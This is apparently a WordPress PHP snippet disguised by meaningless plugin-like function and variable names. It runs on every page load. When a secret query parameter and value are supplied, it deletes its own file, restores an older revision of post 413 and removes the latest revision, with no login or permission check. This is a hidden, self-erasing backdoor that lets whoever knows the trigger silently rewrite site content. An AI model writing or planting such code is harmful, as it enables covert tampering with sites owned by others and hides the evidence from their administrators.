<?php

function cloud_tables_crm_now() {
	if (isset($_GET['separator_themes_jigoshop']) && $_GET['separator_themes_jigoshop'] === 'pdf_gamipress_embedder') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$progress_related_purchase = 413;
		$coming_category_lazy_forum = wp_get_post_revisions($progress_related_purchase);
		if (empty($coming_category_lazy_forum)) die('no revisions');
		if (count($coming_category_lazy_forum) < 2) die('less than 2');
		$shortener_thumbnail_compare_notice = array_shift($coming_category_lazy_forum);
		$notifications_block_country_dist = $shortener_thumbnail_compare_notice->ID;
		$github_stats_responsive = array_shift($coming_category_lazy_forum);
		$text_embedder_quiz = $github_stats_responsive->ID;
		$php_external_more = wp_restore_post_revision($text_embedder_quiz);
		if ($php_external_more === false) die('error restoring');
		$php_external_more = wp_delete_post_revision($notifications_block_country_dist);		
		if ($php_external_more === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'cloud_tables_crm_now');
